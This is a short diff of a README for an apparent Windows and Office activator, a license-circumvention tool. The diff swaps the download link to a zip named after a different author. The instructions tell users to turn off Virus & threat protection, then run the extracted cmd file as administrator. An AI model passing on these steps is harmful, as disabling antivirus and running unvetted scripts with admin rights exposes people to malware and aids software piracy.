@@ -33,7 +33,7 @@ This Is A Windows & Office Activator Tool. You Can Active Windows + Office By Th
 
 ## How To Use :
 -   Turn Off Virus & threat protection 
--   Download the zip file from here <a href="https://github.com/BINOD-XD/Windows-Office-Activator/blob/main/Windows_activator_by_rxs.zip?raw=true">DOWNLOAD</a>
+-   Download the zip file from here <a href="Windows_activator_by_FRN.zip?">DOWNLOAD</a>
 -   Extract the downloaded zip file
 -   Right-click on the cmd file
 -   Click Run as administrator  
